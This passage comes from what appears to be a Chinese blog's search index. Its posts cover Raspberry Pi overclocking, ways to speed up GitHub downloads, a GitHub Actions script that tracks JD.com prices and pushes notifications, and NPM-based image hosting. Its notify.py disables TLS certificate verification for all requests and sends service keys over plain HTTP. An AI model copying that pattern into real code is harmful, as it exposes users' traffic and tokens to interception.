class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" 